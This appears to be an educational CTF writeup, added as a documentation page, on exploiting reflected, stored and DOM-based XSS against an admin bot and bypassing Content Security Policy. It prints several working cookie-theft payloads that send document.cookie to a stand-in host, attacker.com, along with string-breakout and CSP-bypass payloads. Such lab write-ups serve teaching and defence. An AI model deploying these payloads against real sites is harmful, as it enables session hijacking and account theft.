@@ -1,0 +1,232 @@
+---
+title: "Cross-Site Scripting (XSS) CTF Writeup: Stealing Flags"
+sidebarTitle: "XSS"
+description: "Detailed XSS CTF walkthrough covering reflected, stored, and DOM-based XSS with payload crafting, CSP bypass, and cookie theft techniques."
+---
+
+Cross-site scripting challenges are a staple of web CTF categories because they mirror one of the most prevalent vulnerabilities in real-world applications. In a CTF context, XSS almost always means one thing: there's a bot — a headless browser running as an admin — visiting pages you influence, and your job is to steal its cookie or force it to perform an action that reveals the flag. This writeup walks through a challenge that chains all three XSS variants to ultimately exfiltrate an admin session cookie containing the flag.
+
+## Challenge Background
+
+The challenge hosts a simple message board at `http://target.ctf`. Users can post messages, and an admin bot periodically visits every new post to "moderate" it. The flag is stored in the admin's session cookie. Your goal is to craft a payload that causes the admin bot to send its cookie to a server you control.
+
+You have access to `http://attacker.com` (your exfiltration server) where you can receive incoming HTTP requests and read their query parameters.
+
+## Identifying XSS Injection Points
+
+Before crafting any payload, map every location where user-supplied input is reflected in the page. Submit the string `xsstest123` into every input field and search for it in the rendered HTML source. Look for it appearing:
+
+- **Unquoted** in an HTML attribute: `<input value=xsstest123>`
+- **Inside a JavaScript string**: `var q = "xsstest123";`
+- **As raw HTML content**: `<p>xsstest123</p>`
+- **Inside an HTML attribute value**: `<input value="xsstest123">`
+
+Each reflection context requires a different payload structure. Knowing the context before you write your payload is the difference between a one-shot solve and hours of confused trial-and-error.
+
+## XSS Variants
+
+<Tabs>
+  <Tab title="Reflected XSS">
+    Reflected XSS occurs when your input is immediately echoed back in the response without being stored. The classic vector is a search or error parameter in the URL.
+
+    On the message board, the search endpoint at `/search?q=` reflects your query directly into the page:
+
+    ```http
+    GET /search?q=hello HTTP/1.1
+    Host: target.ctf
+    ```
+
+    Response HTML:
+    ```html
+    <p>Search results for: hello</p>
+    ```
+
+    The reflection is inside an HTML paragraph with no encoding — a perfect injection point. Test with the most basic payload first:
+
+    ```html
+    <script>alert(1)</script>
+    ```
+
+    Navigating to `/search?q=<script>alert(1)</script>` triggers an alert box, confirming execution. However, reflected XSS requires the victim to click a crafted link — it won't hit the admin bot, which only visits post URLs. Use this as proof-of-concept and move to stored XSS for the actual exploit.
+  </Tab>
+  <Tab title="Stored XSS">
+    Stored XSS is the variant that wins flags in bot-based challenges. Your payload is saved to the database and executed in the admin's browser when they visit the page — no link-clicking required.
+
+    The message board's post body is rendered without sanitization. Submit a new post with this content:
+
+    ```html
+    <img src=x onerror=alert(1)>
+    ```
+
+    The `<img>` tag with a broken `src` fires `onerror` even when `<script>` tags are filtered. The alert pops when you visit the post — and it will pop in the admin bot's browser too.
+
+    Now escalate to cookie theft:
+
+    ```html
+    <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+    ```
+
+    This redirects the admin bot to your server with its cookies appended as a query parameter. Check your server logs after submitting the post and waiting for the bot's visit cycle.
+
+    Your exfiltration server receives:
+
+    ```
+    GET /steal?c=session=CTF{st0r3d_xss_c00k13_th3ft_ftw} HTTP/1.1
+    Host: attacker.com
+    ```
+
+    Flag captured. But wait — what if the site has a Content Security Policy? Read on.
+  </Tab>
+  <Tab title="DOM-Based XSS">
+    DOM-based XSS happens entirely in the browser — the server never sees the malicious payload. A client-side script reads from a source (like `location.hash` or `document.URL`) and writes it into the DOM unsafely.
+
+    The message board's search feature also has a client-side preview powered by JavaScript:
+
+    ```javascript
+    // Vulnerable client-side code
+    const params = new URLSearchParams(window.location.search);
+    document.getElementById('preview').innerHTML = params.get('q');
+    ```
+
+    The `innerHTML` assignment is the sink. No server-side processing — the payload only exists in the URL fragment or query string and executes purely in the victim's browser.
+
+    Craft a URL that exploits this sink:
+
+    ```
+    http://target.ctf/search?q=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>
+    ```
+
+    Use `fetch()` instead of `document.location` to avoid navigating away from the page (which might interrupt execution in some bot configurations). The `fetch` sends the cookie as a query parameter to your server silently in the background.
+  </Tab>
+</Tabs>
+
+## Exploitation Chain
+
+<Steps>
+  <Step title="Confirm the Injection Context">
+    Submit `"><h1>test` into the post body. If the rendered page shows a large heading and the HTML structure breaks, the input is reflected raw inside an HTML attribute or element without encoding. Identify exactly where in the DOM your input lands before choosing a payload.
+  </Step>
+
+  <Step title="Test Basic Script Execution">
+    Start with the simplest possible proof-of-concept. If `<script>` tags are allowed:
+
+    ```html
+    <script>alert(1)</script>
+    ```
+
+    If scripts are filtered but HTML attributes are not, fall back to event handlers:
+
+    ```html
+    <img src=x onerror=alert(1)>
+    ```
+
+    If angle brackets are filtered but you're inside a JavaScript string context (e.g., `var q = "INPUT"`), break out of the string:
+
+    ```html
+    ";alert(1);//
+    ```
+
+    Confirm execution before adding complexity. An alert popup tells you JavaScript runs — everything after this is just payload refinement.
+  </Step>
+
+  <Step title="Set Up Your Exfiltration Server">
+    You need a server that logs incoming requests. For CTF purposes, use one of these options:
+
+    ```bash
+    # Option 1: Python HTTP server (if you have a public IP or ngrok tunnel)
+    python3 -m http.server 8080
+
+    # Option 2: Use a request-bin service
+    # Navigate to https://requestbin.com and create a bin — you get a public URL
+    # that logs every request made to it
+
+    # Option 3: ngrok tunnel to localhost
+    ngrok http 8080
+    ```
+
+    Replace `http://attacker.com` in all payloads with your actual exfiltration URL. Test it by visiting the URL yourself to confirm it's reachable.
+  </Step>
+
+  <Step title="Craft the Cookie Theft Payload">
+    With execution confirmed and your server ready, deploy the full exfiltration payload as a stored post:
+
+    ```html
+    <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+    ```
+
+    If the `document.location` redirect approach is too disruptive (the bot might navigate away before the request completes), use a more reliable async approach:
+
+    ```html
+    <script>
+      fetch('http://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
+    </script>
+    ```
+
+    Or use an image tag for maximum compatibility across bot environments:
+
+    ```html
+    <img src="http://attacker.com/steal" 
+         onerror="this.src='http://attacker.com/steal?c='+document.cookie">
+    ```
+  </Step>
+
+  <Step title="Wait for the Admin Bot and Capture the Flag">
+    Submit the post, then monitor your exfiltration server. Most CTF bot challenges run the admin visit on a 30–60 second cycle. When the bot visits your post, your server logs the request:
+
+    ```
+    GET /steal?c=session=CTF{st0r3d_xss_c00k13_th3ft_ftw} HTTP/1.1
+    Host: attacker.com
+    User-Agent: HeadlessChrome/...
+    ```
+
+    The flag is the value of the `session` cookie. Submit it to the challenge platform.
+  </Step>
+</Steps>
+
+## CSP Bypass Techniques
+
+A Content Security Policy can block inline scripts and restrict which domains JavaScript may contact. If your payload is blocked, check the CSP header first:
+
+```bash
+curl -I http://target.ctf | grep -i content-security-policy
+```
+
+A common CTF CSP looks like:
+
+```
+Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net; object-src 'none'
+```
+
+This blocks inline `<script>` tags and `onerror` handlers. Common bypasses:
+
+**1. Whitelisted CDN abuse.** If a CDN like `cdn.jsdelivr.net` is whitelisted, load a JavaScript file hosted there:
+
+```html
+<script src="https://cdn.jsdelivr.net/gh/youruser/yourrepo@main/payload.js"></script>
+```
+
+**2. JSONP endpoints.** If a whitelisted domain has a JSONP callback endpoint, use it to inject arbitrary code:
+
+```html
+<script src="https://whitelisted.com/api?callback=alert(1)//"></script>
+```
+
+**3. `unsafe-inline` with a nonce.** If the CSP uses nonces and you can read the nonce value from a reflected script tag elsewhere on the page, include it in your injection.
+
+**4. Dangling markup for CSP bypass with `img-src`.** When scripts are fully blocked but `img-src *` is allowed, use an `<img>` tag with a data-exfiltrating `src` attribute to leak page content character by character.
+
+<Note>
+  When the CSP blocks your exfiltration domain, check whether `connect-src` permits `*` or specific domains. If `img-src` is set to `*` but `connect-src` is restrictive, use `<img src="...">` instead of `fetch()` for exfiltration — image loads bypass `connect-src` restrictions.
+</Note>
+
+## Key Takeaways
+
+- **Identify the reflection context first.** A payload that works inside `<p>` tags will fail inside a JavaScript string or an HTML attribute — tailor your syntax to the context.
+- **Stored XSS wins bot-based CTF challenges.** Reflected XSS requires user interaction; stored XSS fires automatically when the admin bot visits.
+- **`onerror` and `onload` event handlers are your fallback** when `<script>` tags are filtered.
+- **Set up your exfiltration server before deploying the payload.** There's nothing worse than a successful cookie theft you can't receive.
+- **Always check the CSP header.** A well-configured policy forces you to be creative, but almost every CTF CSP has at least one bypass vector.
+
+<Warning>
+  XSS exploitation outside of an explicitly authorized CTF environment or your own systems is illegal and unethical. The techniques in this writeup are for educational purposes and authorized competition use only. Always confirm scope before testing any vulnerability.
+</Warning>
